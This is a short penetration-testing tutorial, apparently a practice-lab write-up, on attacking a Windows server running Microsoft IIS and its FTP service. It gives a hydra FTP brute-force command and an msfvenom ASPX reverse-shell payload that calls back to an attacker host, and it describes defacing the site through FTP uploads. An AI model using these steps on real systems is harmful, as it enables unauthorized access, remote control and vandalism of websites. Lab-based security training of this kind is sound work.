# Targeting Microsoft IIS FTP

## Practice Demo

In this black box pentest against the Windows target, during the enumeration phase we notice a "<mark style="color:red;">Microsoft ftpd</mark>" as well as a "<mark style="color:red;">Microsoft IIS"</mark> Web server. This means they are intertwined, part of the same packge. The ftp server allows users to authenticate to be able to modify the web servers directory.

#### Performing a brute force against the ftp service using hydra

* <mark style="color:yellow;">hydra -L 'userlist' -P 'passlist' targetIP ftp</mark>

When logged in we see a "<mark style="color:red;">asp</mark>" file, that is executed by the webserver.

We can create an "<mark style="color:red;">asp</mark>" payload with msfvenom to create a reverse shell.

* <mark style="color:yellow;">msfvenom -p windows/shell/reverse\_tcp LHOST=attackerIP LPORT=1234 -f aspx > shell.aspx</mark>

Now we transfer it to the target machine through FTP

After confirming the file was transferred, setup the <mark style="color:red;">multi/handler</mark> in msfconsole.

Finally, execute it in the browser:

* <mark style="color:yellow;">http://targetIP/nameofpayload</mark>

Since, in this case it doesn't work, because asp normally only runs simple stuff... we will deface the website

* <mark style="color:yellow;">get index.html</mark>

And then modify the file and upload it again

* <mark style="color:yellow;">put index.html</mark>

















